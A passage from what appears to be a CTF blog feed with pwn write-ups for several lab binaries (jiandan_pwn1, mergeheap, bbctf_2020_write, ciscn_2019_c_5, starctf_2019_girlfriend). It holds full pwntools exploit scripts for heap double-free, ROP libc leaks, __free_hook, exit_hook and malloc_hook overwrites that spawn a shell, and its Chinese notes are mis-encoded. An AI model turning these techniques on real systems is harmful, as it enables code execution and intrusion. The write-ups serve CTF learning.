p.sendlineafter(&#39;Enter new book description: &#39;,content)def show():    p.sendlineafter(&#39;&gt; &#39;,&#39;4&#39;)def free(idd):    p.sendlineafter(&#39;&gt; &#39;,&#39;2&#39;)    p.sendlineafter(&#39;Enter the book id you want to delete: &#39;,str(idd))def ren(content):    p.sendlineafter(&#39;&gt; &#39;,&#39;5&#39;)    p.sendlineafter(&#39;Enter author name: &#39;,content)add(0xd0,&#39;aaaaaaaa&#39;,0x20,&#39;bbbbbbb&#39;) #1show()p.recvuntil(&quot;kb&quot;)heap_addr=u64(p.recv(6)[-6:].ljust(8,b&#39;\x00&#39;))print(&#39;addr&#39;+hex(heap_addr))add(0x80,&#39;cccccccc&#39;,0x60,&#39;dddddddd&#39;) #2 add(0x10,&#39;bin/sh&#39;,0x10,&#39;ffffffff&#39;) #3free(2)edit(1,p64(1)+p64(heap_addr+0x30)+p64(heap_addr+0x30+0x90+0xe0+0x10)+p64(0x20))ren(&#39;a&#39;*0x20)show()p.recvuntil(&#39;Name: &#39;)main_addr=u64(p.recvuntil(&#39;\x7f&#39;).ljust(8,b&#39;\x00&#39;))-88malloc_hook=main_addr-0x10base=malloc_hook-libc.sym[&#39;__malloc_hook&#39;]free_hook=base+libc.sym[&#39;__free_hook&#39;]system=base+libc.sym[&#39;system&#39;]print(&#39;main_addr&#39;+hex(main_addr))edit(1,p64(free_hook)+p64(0x20))edit(3,p64(system))free(3)#gdb.attach(p)sleep(1)#p.sendline(payload)p.interactive()</code></pre>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>freenote_x64</title>
      <link href="/2024/03/10/freenote-x64/"/>
      <url>/2024/03/10/freenote-x64/</url>
      
        <content type="html"><![CDATA[<p><img src="C:/Users/23633/AppData/Roaming/Typora/typora-user-images/image-20240310205447683.png" alt="image-20240310205447683"></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>jiandan_pwn1</title>
      <link href="/2024/03/09/jiandan-pwn1/"/>
      <url>/2024/03/09/jiandan-pwn1/</url>
      
        <content type="html"><![CDATA[<p><img src="https://i0.imgs.ovh/2024/03/08/QEhHH.png" alt="image-20240309170306025"></p><h5 id="ä¸€ä¸ªå­—èŠ‚ä¸€ä¸ªå­—èŠ‚è¾“å…¥ï¼Œç„¶åv4åœ¨rbp-4çš„ä½ç½®ï¼Œç›´æ¥å‘é€p32-0x10d-0då…ˆæ”¾åœ¨å·¦è¾¹-x61-çš„ä½ç½®ï¼Œç„¶åæŠŠå€¼æ”¾åˆ°rsp-0x10dçš„ä½ç½®ï¼Œåé¢çš„è¾“å…¥ä¹Ÿä¸å½±å“v4çš„å€¼ã€‚"><a href="#ä¸€ä¸ªå­—èŠ‚ä¸€ä¸ªå­—èŠ‚è¾“å…¥ï¼Œç„¶åv4åœ¨rbp-4çš„ä½ç½®ï¼Œç›´æ¥å‘é€p32-0x10d-0då…ˆæ”¾åœ¨å·¦è¾¹-x61-çš„ä½ç½®ï¼Œç„¶åæŠŠå€¼æ”¾åˆ°rsp-0x10dçš„ä½ç½®ï¼Œåé¢çš„è¾“å…¥ä¹Ÿä¸å½±å“v4çš„å€¼ã€‚" class="headerlink" title="ä¸€ä¸ªå­—èŠ‚ä¸€ä¸ªå­—èŠ‚è¾“å…¥ï¼Œç„¶åv4åœ¨rbp-4çš„ä½ç½®ï¼Œç›´æ¥å‘é€p32(0x10d),0då…ˆæ”¾åœ¨å·¦è¾¹(\x61)çš„ä½ç½®ï¼Œç„¶åæŠŠå€¼æ”¾åˆ°rsp+0x10dçš„ä½ç½®ï¼Œåé¢çš„è¾“å…¥ä¹Ÿä¸å½±å“v4çš„å€¼ã€‚"></a>ä¸€ä¸ªå­—èŠ‚ä¸€ä¸ªå­—èŠ‚è¾“å…¥ï¼Œç„¶åv4åœ¨rbp-4çš„ä½ç½®ï¼Œç›´æ¥å‘é€p32(0x10d),0då…ˆæ”¾åœ¨å·¦è¾¹(\x61)çš„ä½ç½®ï¼Œç„¶åæŠŠå€¼æ”¾åˆ°rsp+0x10dçš„ä½ç½®ï¼Œåé¢çš„è¾“å…¥ä¹Ÿä¸å½±å“v4çš„å€¼ã€‚</h5><p><img src="https://i0.imgs.ovh/2024/03/08/QEsoD.png" alt="image-20240309172253099"></p><p><img src="https://i0.imgs.ovh/2024/03/08/QExYo.png" alt="image-20240309170455669"></p><h5 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h5><pre><code class="lang-py">from pwn import*from LibcSearcher import *#p=remote(&quot;node5.buuoj.cn&quot;,27841)p=process(&quot;./jiandan_pwn1&quot;)context.log_level=&quot;debug&quot;puts_func=0x4007BFputs_plt=0x400590puts_got=0x601018pop_rdi=0x400843libc=ELF(&#39;./libc-2.23.so&#39;)gdb.attach(p,&#39;b *0x400783&#39;)sleep(1)payload=b&#39;a&#39;*(0x110-4)+p32(0x10d)+b&#39;a&#39;*8+p64(pop_rdi)+p64(puts_got)+p64(puts_func)p.sendlineafter(&#39;Hack 4 fun!&#39;,payload)puts_got=u64(p.recvuntil(&#39;\x7f&#39;).strip().ljust(8,b&#39;\x00&#39;))base=puts_got-libc.sym[&#39;puts&#39;]system=base+libc.sym[&#39;system&#39;]binsh=base+next(libc.search(b&#39;bin/sh&#39;))print(&#39;puts&#39;+hex(puts_got))#payload=b&#39;a&#39;*(0x110-4)+p32(0x10d)+b&#39;a&#39;*8+p64(pop_rdi)+p64(binsh)+p64(system)p.sendline(payload)p.interactive()</code></pre>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>mergeheap</title>
      <link href="/2024/03/08/mergeheap/"/>
      <url>/2024/03/08/mergeheap/</url>
      
        <content type="html"><![CDATA[<p>ä¿æŠ¤å…¨å¼€ï¼Œlibc-2.27,mallocå¤§å°é™åˆ¶äº†0x400ï¼Œæœ‰ä¸ªåˆå¹¶å †çš„å‡½æ•°ï¼Œå¯ä»¥åˆå¹¶å¤§äº0x400çš„ï¼Œä¸è¿‡é‡Šæ”¾çš„æ—¶å€™æ€»æ˜¯å’Œtop_chunkåˆå¹¶ã€‚æ‰€ä»¥å¾—ç”¨å¦ä¸€ç§æ–¹æ³•æ³„éœ²libc.</p><p><img src="https://i0.imgs.ovh/2024/03/08/QYjEN.png" alt="image-20240308204851522"></p><pre><code class="lang-py">add(0x210,&#39;aaaa&#39;)add(0x210,&#39;cccc&#39;)add(0x10,&#39;dddd&#39;)merge(0,1)free(3)free(2)</code></pre><h5 id="è¿™ç§æ–¹æ³•å¥½åƒä¸è¡Œ"><a href="#è¿™ç§æ–¹æ³•å¥½åƒä¸è¡Œ" class="headerlink" title="è¿™ç§æ–¹æ³•å¥½åƒä¸è¡Œ"></a>è¿™ç§æ–¹æ³•å¥½åƒä¸è¡Œ</h5><pre><code class="lang-py">for i in range(8):    add(0x80,&#39;cccc&#39;)for i in range(1,8):     free(i)free(0)add(0x8,&#39;cccccccc&#39;)show(0)p.recvuntil(&#39;cccccccc&#39;)main_addr=u64(p.recvuntil(b&#39;\x7f&#39;).ljust(8,b&#39;\x00&#39;))</code></pre><pre><code class="lang-py">add(0x60,&#39;aaaa\n&#39;) #1add(0x30,&#39;a&#39;*0x30) #2add(0x38,&#39;a&#39;*0x38) #3add(0x100,&#39;a&#39;)       #4add(0x68,&#39;a&#39;)      #5add(0x20,&#39;a&#39;)       #6add(0x20,&#39;c&#39;)      #7add(0x20,&#39;f&#39;)      #8add(0x20,&#39;d&#39;)      #9</code></pre><pre><code class="lang-py">free(5)free(7)free(8)</code></pre><pre><code class="lang-py">merge(2,3)</code></pre><p><img src="https://i0.imgs.ovh/2024/03/08/QY5lR.png" alt="image-20240309145439198"></p><h5 id="ä¸‹ä¸€ä¸ªå †çš„sizeä½å› ä¸ºå †2ï¼Œå †3çš„åˆå¹¶è¢«æ”¹äº†ï¼Œå…·ä½“ä¸å¤ªæ‡‚"><a href="#ä¸‹ä¸€ä¸ªå †çš„sizeä½å› ä¸ºå †2ï¼Œå †3çš„åˆå¹¶è¢«æ”¹äº†ï¼Œå…·ä½“ä¸å¤ªæ‡‚" class="headerlink" title="ä¸‹ä¸€ä¸ªå †çš„sizeä½å› ä¸ºå †2ï¼Œå †3çš„åˆå¹¶è¢«æ”¹äº†ï¼Œå…·ä½“ä¸å¤ªæ‡‚"></a>ä¸‹ä¸€ä¸ªå †çš„sizeä½å› ä¸ºå †2ï¼Œå †3çš„åˆå¹¶è¢«æ”¹äº†ï¼Œå…·ä½“ä¸å¤ªæ‡‚</h5><p><img src="https://i0.imgs.ovh/2024/03/08/QYYbp.png" alt="image-20240309150323508"></p><pre><code class="lang-py">free(6)</code></pre><p><img src="https://i0.imgs.ovh/2024/03/08/QYDXu.png" alt="image-20240309150602685"></p><p><img src="https://i0.imgs.ovh/2024/03/08/QYEBl.png" alt="image-20240309151308724"></p><h5 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h5><pre><code class="lang-py">from pwn import*from LibcSearcher import *#p=remote(&quot;node5.buuoj.cn&quot;,25860)p=process(&quot;./mergeheap&quot;)context.log_level=&quot;debug&quot;context(log_level=&#39;debug&#39;,os=&#39;linux&#39;,arch=&#39;amd64&#39;)libc=ELF(&#39;./libc-2.27.so&#39;)def add(size,content):    p.sendlineafter(&#39;&gt;&gt;&#39;,&#39;1&#39;)    p.sendlineafter(&#39;len:&#39;,str(size))    p.sendlineafter(&#39;content:&#39;,content)def show(index):    p.sendlineafter(&#39;&gt;&gt;&#39;,&#39;2&#39;)    p.sendlineafter(&#39;idx:&#39;,str(index))def free(index):    p.sendlineafter(&#39;&gt;&gt;&#39;,&#39;3&#39;)    p.sendlineafter(&#39;idx:&#39;,str(index))def merge(index1,index2):    p.sendlineafter(&#39;&gt;&gt;&#39;,&#39;4&#39;)    p.sendlineafter(&#39;idx1:&#39;,str(index1))    p.sendlineafter(&#39;idx2:&#39;,str(index2))for i in range(8):    add(0x80,&#39;cccc&#39;)for i in range(1,8):     free(i)free(0)add(0x8,&#39;cccccccc&#39;)show(0)p.recvuntil(&#39;cccccccc&#39;)main_addr=u64(p.recvuntil(b&#39;\x7f&#39;).ljust(8,b&#39;\x00&#39;))print(hex(main_addr-0x80))main_arena=main_addr-96-0x80malloc=main_arena-0x10base=malloc-libc.sym[&#39;__malloc_hook&#39;]free_hook=base+libc.sym[&#39;__free_hook&#39;]one=[0x4f2c5,0x4f322,0x10a38c]one_gadget=base+one[1]add(0x60,&#39;aaaa\n&#39;) #1add(0x30,&#39;a&#39;*0x30) #2add(0x38,&#39;a&#39;*0x38) #3add(0x100,&#39;a&#39;)       #4add(0x68,&#39;a&#39;)      #5add(0x20,&#39;a&#39;)       #6add(0x20,&#39;c&#39;)      #7add(0x20,&#39;f&#39;)      #8add(0x20,&#39;d&#39;)      #9free(5)free(7)free(8)merge(2,3)free(6)payload=b&#39;a&#39;*0x28+p64(0x31)+p64(free_hook)+p64(0)add(0x100,payload)add(0x20,&#39;aaaa&#39;)add(0x20,&#39;cccc&#39;)add(0x20,p64(one_gadget))free(9)#gdb.attach(p)sleep(1)p.interactive()</code></pre>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>bbctf_2020_write</title>
      <link href="/2024/03/08/bbctf-2020-write/"/>
      <url>/2024/03/08/bbctf-2020-write/</url>
      
        <content type="html"><![CDATA[<p><img src="https://i0.imgs.ovh/2024/03/07/QUp53.png" alt="image-20240308192349360"></p><p><img src="https://i0.imgs.ovh/2024/03/07/QUMbe.png" alt="image-20240308192110221"> </p><h5 id="å¯ä»¥æ³„éœ²äº†puts-got-å¯ä»¥ç®—åç§»ï¼Œç¨‹åºå¯ä»¥æ”¹åœ°å€çš„å†…å®¹ï¼Œé‚£ä¹ˆå¯ä»¥æ”¹exit-hook-exitå‡½æ•°ä¼šæ‰§è¡Œrun-exit-handlersï¼Œç„¶åè¿™ä¸ªå‡½æ•°ä¼šè°ƒç”¨-dl-finiï¼Œç„¶åè¿™ä¸ª-dl-finiçš„æºç è°ƒç”¨äº†-rtld-lock-lock-recursive-å’Œ-rtld-lock-unlock-recursiveï¼Œæ‰€ä»¥åªéœ€è¦å‘å…¶ä¸­ä¸€ä¸ªå†™å…¥one-gadgetå°±è¡Œäº†ã€‚"><a href="#å¯ä»¥æ³„éœ²äº†puts-got-å¯ä»¥ç®—åç§»ï¼Œç¨‹åºå¯ä»¥æ”¹åœ°å€çš„å†…å®¹ï¼Œé‚£ä¹ˆå¯ä»¥æ”¹exit-hook-exitå‡½æ•°ä¼šæ‰§è¡Œrun-exit-handlersï¼Œç„¶åè¿™ä¸ªå‡½æ•°ä¼šè°ƒç”¨-dl-finiï¼Œç„¶åè¿™ä¸ª-dl-finiçš„æºç è°ƒç”¨äº†-rtld-lock-lock-recursive-å’Œ-rtld-lock-unlock-recursiveï¼Œæ‰€ä»¥åªéœ€è¦å‘å…¶ä¸­ä¸€ä¸ªå†™å…¥one-gadgetå°±è¡Œäº†ã€‚" class="headerlink" title="å¯ä»¥æ³„éœ²äº†puts_got,å¯ä»¥ç®—åç§»ï¼Œç¨‹åºå¯ä»¥æ”¹åœ°å€çš„å†…å®¹ï¼Œé‚£ä¹ˆå¯ä»¥æ”¹exit_hook,exitå‡½æ•°ä¼šæ‰§è¡Œrun_exit_handlersï¼Œç„¶åè¿™ä¸ªå‡½æ•°ä¼šè°ƒç”¨_dl_finiï¼Œç„¶åè¿™ä¸ª_dl_finiçš„æºç è°ƒç”¨äº† rtld_lock_lock_recursive å’Œ __rtld_lock_unlock_recursiveï¼Œæ‰€ä»¥åªéœ€è¦å‘å…¶ä¸­ä¸€ä¸ªå†™å…¥one_gadgetå°±è¡Œäº†ã€‚"></a>å¯ä»¥æ³„éœ²äº†puts_got,å¯ä»¥ç®—åç§»ï¼Œç¨‹åºå¯ä»¥æ”¹åœ°å€çš„å†…å®¹ï¼Œé‚£ä¹ˆå¯ä»¥æ”¹exit_hook,exitå‡½æ•°ä¼šæ‰§è¡Œ<strong>run_exit_handlersï¼Œç„¶åè¿™ä¸ªå‡½æ•°ä¼šè°ƒç”¨_dl_finiï¼Œç„¶åè¿™ä¸ª_dl_finiçš„æºç è°ƒç”¨äº† </strong>rtld_lock_lock_recursive å’Œ __rtld_lock_unlock_recursiveï¼Œæ‰€ä»¥åªéœ€è¦å‘å…¶ä¸­ä¸€ä¸ªå†™å…¥one_gadgetå°±è¡Œäº†ã€‚</h5><h5 id="ä¸ºäº†ä»¥åæ–¹ä¾¿ï¼Œä»¥åå°±è¿™æ ·ç®—"><a href="#ä¸ºäº†ä»¥åæ–¹ä¾¿ï¼Œä»¥åå°±è¿™æ ·ç®—" class="headerlink" title="ä¸ºäº†ä»¥åæ–¹ä¾¿ï¼Œä»¥åå°±è¿™æ ·ç®—"></a>ä¸ºäº†ä»¥åæ–¹ä¾¿ï¼Œä»¥åå°±è¿™æ ·ç®—</h5><p><strong>åœ¨libc-2.23ä¸­</strong><br><strong>exit_hook = libc_base+0x5f0040+3848</strong></p><p><strong>exit_hook = libc_base+0x5f0040+3856</strong></p><p><strong>åœ¨libc-2.27ä¸­</strong></p><p><strong>exit_hook = libc_base+0x619060+3840</strong></p><h5 id="exit-hook-libc-base-0x619060-3848"><a href="#exit-hook-libc-base-0x619060-3848" class="headerlink" title="exit_hook = libc_base+0x619060+3848"></a>exit_hook = libc_base+0x619060+3848</h5><h5 id="å…·ä½“çš„exit-hookå¯ä»¥çœ‹è¿™ï¼Œç„¶åç”¨one-gadget-ç„¶åè¾“å…¥çš„è¯å¾—ç”¨å­—ç¬¦ä¸²æ ¼å¼"><a href="#å…·ä½“çš„exit-hookå¯ä»¥çœ‹è¿™ï¼Œç„¶åç”¨one-gadget-ç„¶åè¾“å…¥çš„è¯å¾—ç”¨å­—ç¬¦ä¸²æ ¼å¼" class="headerlink" title="å…·ä½“çš„exit_hookå¯ä»¥çœ‹è¿™ï¼Œç„¶åç”¨one_gadget.ç„¶åè¾“å…¥çš„è¯å¾—ç”¨å­—ç¬¦ä¸²æ ¼å¼"></a>å…·ä½“çš„exit_hookå¯ä»¥çœ‹è¿™ï¼Œç„¶åç”¨one_gadget.ç„¶åè¾“å…¥çš„è¯å¾—ç”¨å­—ç¬¦ä¸²æ ¼å¼</h5><p><a href="[exit_hookåœ¨pwné¢˜ä¸­çš„åº”ç”¨ - ç å†œæ•™ç¨‹ (manongjc.com">exit_hookåœ¨pwné¢˜ä¸­çš„åº”ç”¨</a>](<a href="http://www.manongjc.com/detail/21-aktzmrsypltrrll.html">http://www.manongjc.com/detail/21-aktzmrsypltrrll.html</a>))</p><pre><code class="lang-py">from pwn import*from LibcSearcher import *p=remote(&quot;node5.buuoj.cn&quot;,29131)#p=process(&quot;./bbctf_2020_write&quot;)context.log_level=&quot;debug&quot;libc=ELF(&#39;./libc-2.27.so&#39;)p.recvuntil(&#39;puts: &#39;)puts_addr=int(p.recv(14),16)base=puts_addr-libc.sym[&#39;puts&#39;]print(&#39;put&#39;+hex(puts_addr))p.sendline(&#39;w&#39;)exit_hook=base++0x619060+3848one=[0x4f2c5,0x4f322,0x10a38c]one_gadget=one[1]+basep.sendlineafter(&#39;ptr: &#39;,str(exit_hook))p.sendlineafter(&#39;val: &#39;,str(one_gadget))p.sendlineafter(&#39;(q)uit&#39;,&#39;q&#39;)#gdb.attach(p)#sleep(1)p.interactive()</code></pre>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>ciscn_2019_c_5</title>
      <link href="/2024/03/08/ciscn-2019-c-5/"/>
      <url>/2024/03/08/ciscn-2019-c-5/</url>
      
        <content type="html"><![CDATA[<p> ä¿æŠ¤å…¨å¼€</p><p>æœ‰æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´ä½†æ˜¯ç”¨%n$pä¹‹ç±»çš„ä¼šæŠ¥é”™ï¼Œç”¨%pä¸ä¼šï¼Œç®—å¾—åç§»æ˜¯8</p><p><img src="https://i0.imgs.ovh/2024/03/07/QOW8j.png" alt="image-20240308125027309"></p><p><img src="https://i0.imgs.ovh/2024/03/07/QO0AI.png" alt="image-20240308125159916"></p><pre><code class="lang-py">p.sendlineafter(&#39;name?&#39;,&#39;%p%p%p%p%p%p%p&#39;)p.recvuntil(&#39;59&#39;)io_stder=int(p.recv(14),16)</code></pre><h5 id="æ¥æ”¶çš„è¯ä¸æ˜¯p-recvuntil-â€˜-x59â€™-ï¼Œè€Œæ˜¯p-recvuntil-â€˜59â€™-ï¼Œè¿™é‡Œæˆ‘çŠ¯äº†ä¸ªé”™è¯¯"><a href="#æ¥æ”¶çš„è¯ä¸æ˜¯p-recvuntil-â€˜-x59â€™-ï¼Œè€Œæ˜¯p-recvuntil-â€˜59â€™-ï¼Œè¿™é‡Œæˆ‘çŠ¯äº†ä¸ªé”™è¯¯" class="headerlink" title="æ¥æ”¶çš„è¯ä¸æ˜¯p.recvuntil(â€˜\x59â€™)ï¼Œè€Œæ˜¯p.recvuntil(â€˜59â€™)ï¼Œè¿™é‡Œæˆ‘çŠ¯äº†ä¸ªé”™è¯¯"></a>æ¥æ”¶çš„è¯ä¸æ˜¯p.recvuntil(â€˜\x59â€™)ï¼Œè€Œæ˜¯p.recvuntil(â€˜59â€™)ï¼Œè¿™é‡Œæˆ‘çŠ¯äº†ä¸ªé”™è¯¯</h5><p><img src="https://i0.imgs.ovh/2024/03/07/Qe2aT.png" alt="image-20240308151037911"></p><p>è¿™é‡Œå¯¹åº”ç¬¬ä¸ƒä¸ªå‚æ•°</p><p><img src="https://i0.imgs.ovh/2024/03/07/QeoBo.png" alt="image-20240308151240318"></p><h5 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h5><pre><code class="lang-py">from pwn import *p=process(&#39;./ciscn_2019_c_5&#39;)#p=remote(&#39;node5.buuoj.cn&#39;,28941)elf=ELF(&#39;./ciscn_2019_c_5&#39;)libc=elf.libcdef add(size,story):    p.sendlineafter(&#39;:&#39;,&#39;1&#39;)    p.sendlineafter(&#39;story:&#39;,str(size))    p.sendlineafter(&#39;story:&#39;,story)def edit():    p.sendlineafter(&#39;:&#39;,&#39;2&#39;)def show():    p.sendlineafter(&#39;:&#39;,&#39;3&#39;)def free(idx):    p.sendlineafter(&#39;:&#39;,&#39;4&#39;)    p.sendlineafter(&#39;index:&#39;,str(idx))def debug():    gdb.attach(p)    sleep(1)p.sendlineafter(&#39;name?&#39;,&#39;%p%p%p%p%p%p%p&#39;)p.recvuntil(&#39;59&#39;)debug()io_stder=int(p.recv(14),16)#.ljust(8,b&#39;\x00&#39;)p.sendlineafter(&#39;input your ID.&#39;,&#39;kkkk&#39;)base=io_stder-libc.sym[&#39;_IO_2_1_stderr_&#39;]system=base+libc.sym[&#39;system&#39;]print(&#39;io_st  &#39;+hex(io_stder)+&#39;system  &#39;+hex(system))free_hook=base+libc.sym[&#39;__free_hook&#39;]add(0x60,&#39;aaaa&#39;) #0add(0x60,&#39;bbbb&#39;) #1add(0x60,&#39;bin/sh\n&#39;) #2free(0)free(1)free(0)add(0x60,p64(free_hook)) #3add(0x60,&#39;aaaa&#39;) #4add(0x60,&#39;dddd&#39;) #5add(0x60,p64(system))free(2)#p.interactive()</code></pre>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>starctf_2019_girlfriend</title>
      <link href="/2024/03/06/starctf-2019-girlfriend/"/>
      <url>/2024/03/06/starctf-2019-girlfriend/</url>
      
        <content type="html"><![CDATA[<p>ä¿æŠ¤å…¨å¼€,æœ¬æƒ³ä»¥ç®€å•çš„uafå»è§£å†³ï¼Œä½†æ˜¯å´ä¼šå†…å­˜é”™è¯¯ï¼Œæ‰€ä»¥è¿™ä¸ªæ–¹æ³•ä¸è¡Œ</p><pre><code class="lang-py">from pwn import*from LibcSearcher import *#p=remote(&quot;node4.buuoj.cn&quot;,)p=process(&quot;./starctf_2019_girlfriend&quot;)context.log_level=&quot;debug&quot;libc=ELF(&#39;./libc-2.23.so&#39;)def add(size,content1,content2):    p.sendlineafter(&#39;Input your choice:&#39;,&#39;1&#39;)    p.sendlineafter(&quot;girl&#39;s name&quot;,str(size))    p.sendlineafter(&#39;please inpute her name:&#39;,content1)    p.sendlineafter(&#39;please input her call:&#39;,content2)def show(index):    p.sendlineafter(&#39;Input your choice:&#39;,&#39;2&#39;)    p.sendlineafter(&#39;Please input the index:&#39;,str(index))def free(index):    p.sendlineafter(&#39;Input your choice:&#39;,&#39;4&#39;)    p.sendlineafter(&#39;Please input the index:&#39;,str(index))add(0x20,&#39;aaaa&#39;,&#39;bbbb&#39;)add(0x80,&#39;aaaa&#39;,&#39;bbbb&#39;)free(0)free(1)show(0)p.recvuntil(&#39;name:&#39;)main_arena=u64(p.recvuntil(&#39;\x7f&#39;)[-6:].ljust(8,b&#39;\x00&#39;))-88base=main_arena-0x10-libc.sym[&#39;__malloc_hook&#39;]system=base+libc.sym[&#39;system&#39;]free_hook=base+libc.sym[&#39;__free_hook&#39;]add(0x20,&#39;dddd&#39;,&#39;eeee&#39;)add(0x20,&#39;/bin/sh&#39;,&#39;cccc&#39;)print(&#39;main_arena&#39;+hex(main_arena))free(2) #2free(3) #3free(2)gdb.attach(p)sleep(1)add(0x20,p64(free_hook-0x10),&#39;dddd&#39;)add(0x20,&#39;cccc&#39;,&#39;dddd&#39;)add(0x20,&#39;eeee&#39;,&#39;vvvv&#39;)add(0x20,p64(system),&#39;dddd&#39;)p.interactive()</code></pre><p><img src="https://i0.imgs.ovh/2024/03/06/QwhQd.png" alt="image-20240307120041249"></p><p><img src="https://i0.imgs.ovh/2024/03/06/Qwk1T.png" alt="image-20240306215632879"></p><p><img src="https://i0.imgs.ovh/2024/03/06/Qw0vu.png" alt="image-20240306215708434"></p><h5 id="é¦–å…ˆmallocä¸€ä¸ª0x80å¤§å°çš„å †ï¼Œå†ç”³è¯·0x60å¤§å°çš„ï¼Œåé¢æ”¹æˆæ¯”0x60å°çš„å †æ—¶éƒ½ä¼šå‡ºç°å†…å­˜æŠ¥é”™ï¼Œfreeå †0çš„æ—¶å€™ä¸ä¼šå’Œtopchunkåˆå¹¶ï¼Œå¾—åˆ°main-arena-88"><a href="#é¦–å…ˆmallocä¸€ä¸ª0x80å¤§å°çš„å †ï¼Œå†ç”³è¯·0x60å¤§å°çš„ï¼Œåé¢æ”¹æˆæ¯”0x60å°çš„å †æ—¶éƒ½ä¼šå‡ºç°å†…å­˜æŠ¥é”™ï¼Œfreeå †0çš„æ—¶å€™ä¸ä¼šå’Œtopchunkåˆå¹¶ï¼Œå¾—åˆ°main-arena-88" class="headerlink" title="é¦–å…ˆmallocä¸€ä¸ª0x80å¤§å°çš„å †ï¼Œå†ç”³è¯·0x60å¤§å°çš„ï¼Œåé¢æ”¹æˆæ¯”0x60å°çš„å †æ—¶éƒ½ä¼šå‡ºç°å†…å­˜æŠ¥é”™ï¼Œfreeå †0çš„æ—¶å€™ä¸ä¼šå’Œtopchunkåˆå¹¶ï¼Œå¾—åˆ°main_arena+88"></a>é¦–å…ˆmallocä¸€ä¸ª0x80å¤§å°çš„å †ï¼Œå†ç”³è¯·0x60å¤§å°çš„ï¼Œåé¢æ”¹æˆæ¯”0x60å°çš„å †æ—¶éƒ½ä¼šå‡ºç°å†…å­˜æŠ¥é”™ï¼Œfreeå †0çš„æ—¶å€™ä¸ä¼šå’Œtopchunkåˆå¹¶ï¼Œå¾—åˆ°main_arena+88</h5><pre><code class="lang-py">add(0x80,&#39;aaaa&#39;,&#39;bbbb&#39;)add(0x60,&#39;cccc&#39;,&#39;ssss&#39;)add(0x60,&#39;dddd&#39;,&#39;eeee&#39;)free(0)show(0)p.recvuntil(&#39;name:&#39;)main_arena=u64(p.recvuntil(&#39;\x7f&#39;)[-6:].ljust(8,b&#39;\x00&#39;))print(&#39;main_arena&#39;+hex(main_arena))malloc_hook=main_arena-88-0x10base=malloc_hook-libc.sym[&#39;__malloc_hook&#39;]</code></pre><pre><code class="lang-py">free(2)free(1)free(2)one = [0x45226, 0x4527a, 0xf03a4, 0xf1147]one_gadget=base+one[3]realloc=libc.sym[&#39;realloc&#39;]+base#è¿™é‡Œçš„è¯å¾—ç”¨åˆ°</code></pre><h5 id="realloc-hook-malloc-hook-0x8"><a href="#realloc-hook-malloc-hook-0x8" class="headerlink" title="realloc_hook=malloc_hook-0x8"></a>realloc_hook=malloc_hook-0x8</h5><pre><code class="lang-py">add(0x60,p64(malloc_hook-0x23),p64(malloc_hook-0x23))add(0x60,&#39;cccc&#39;,&#39;dddd&#39;)add(0x60,&#39;dddd&#39;,&#39;eeee&#39;)print(&#39;one_gadget=&#39;+hex(one_gadget)+&#39;   malloc=&#39;+hex(malloc_hook-0x23)+&#39;   realloc=&#39;+hex(realloc))payload=b&#39;a&#39;*(0x13-8)+p64(one_gadget)+p64(realloc+2)add(0x60,payload,&#39;cccc&#39;)</code></pre><p><img src="https://i0.imgs.ovh/2024/03/06/Qso0K.png" alt="image-20240307191637279"></p><h5 id="ä½¿ç”¨one-gadgetçš„æ¡ä»¶"><a href="#ä½¿ç”¨one-gadgetçš„æ¡ä»¶" class="headerlink" title="ä½¿ç”¨one_gadgetçš„æ¡ä»¶"></a>ä½¿ç”¨one_gadgetçš„æ¡ä»¶</h5><p><img src="https://i0.imgs.ovh/2024/03/06/Qsuaj.png" alt="image-20240307191828389"></p><h5 id="å…³äºreallocå‡½æ•°è°ƒæ•´å‡½æ•°æ ˆå¸§çš„çŸ¥è¯†ï¼Œå…³äºä¸ºä»€ä¹ˆç”¨realloc-2çš„åœ°å€"><a href="#å…³äºreallocå‡½æ•°è°ƒæ•´å‡½æ•°æ ˆå¸§çš„çŸ¥è¯†ï¼Œå…³äºä¸ºä»€ä¹ˆç”¨realloc-2çš„åœ°å€" class="headerlink" title="å…³äºreallocå‡½æ•°è°ƒæ•´å‡½æ•°æ ˆå¸§çš„çŸ¥è¯†ï¼Œå…³äºä¸ºä»€ä¹ˆç”¨realloc+2çš„åœ°å€"></a>å…³äºreallocå‡½æ•°è°ƒæ•´å‡½æ•°æ ˆå¸§çš„çŸ¥è¯†ï¼Œå…³äºä¸ºä»€ä¹ˆç”¨realloc+2çš„åœ°å€</h5><p><a href="[ä½¿ç”¨reallocå‡½æ•°æ¥è°ƒæ•´æ ˆå¸§è®©one_gadgetç”Ÿæ•ˆ | ZIKH26&#39;s Blog](https://zikh26.github.io/posts/f7fd9662.html">é“¾æ¥æ–‡æœ¬</a>)</p><h5 id="è°ƒè¯•å‘ç°é™¤äº†malloc-hook-0x23çš„åœ°å€å¯ä»¥æ”¹å…¶å®ƒçš„åœ°å€éƒ½ä¼šæŠ¥é”™ï¼Œå¤š1å°‘1éƒ½ä¸è¡Œ"><a href="#è°ƒè¯•å‘ç°é™¤äº†malloc-hook-0x23çš„åœ°å€å¯ä»¥æ”¹å…¶å®ƒçš„åœ°å€éƒ½ä¼šæŠ¥é”™ï¼Œå¤š1å°‘1éƒ½ä¸è¡Œ" class="headerlink" title="è°ƒè¯•å‘ç°é™¤äº†malloc_hook-0x23çš„åœ°å€å¯ä»¥æ”¹å…¶å®ƒçš„åœ°å€éƒ½ä¼šæŠ¥é”™ï¼Œå¤š1å°‘1éƒ½ä¸è¡Œ"></a>è°ƒè¯•å‘ç°é™¤äº†malloc_hook-0x23çš„åœ°å€å¯ä»¥æ”¹å…¶å®ƒçš„åœ°å€éƒ½ä¼šæŠ¥é”™ï¼Œå¤š1å°‘1éƒ½ä¸è¡Œ</h5><p><img src="https://i0.imgs.ovh/2024/03/06/QsU1O.png" alt="image-20240307193119248"></p><h5 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h5><pre><code class="lang-py">from pwn import*from LibcSearcher import 